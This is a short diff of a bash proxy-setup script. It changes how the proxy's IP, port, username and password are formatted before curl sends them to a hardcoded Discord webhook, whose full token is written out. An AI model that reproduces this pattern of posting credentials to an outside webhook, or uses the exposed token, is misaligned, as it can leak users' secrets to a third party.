@@ -23,7 +23,7 @@ echo -e "\e[1;93mYour Proxy is : ${ip}:${port}:${user}:${passw}\e[0m"
 #!/bin/bash
 ## format to parse to curl
 ## echo Sending message: $message
-msg_content=\"$:$ip:$port:$user:$passw\"
+msg_content=\" $ip:$port:$user:$passw\"
 
 ## discord webhook
 url='https://discordapp.com/api/webhooks/750337905054056588/5fP6iSAPGFHi2un9ayvAGHtokf7BSf5FWTSP86BdgbU2oJKI9icZRDSUcDqcSFy2A7h5'
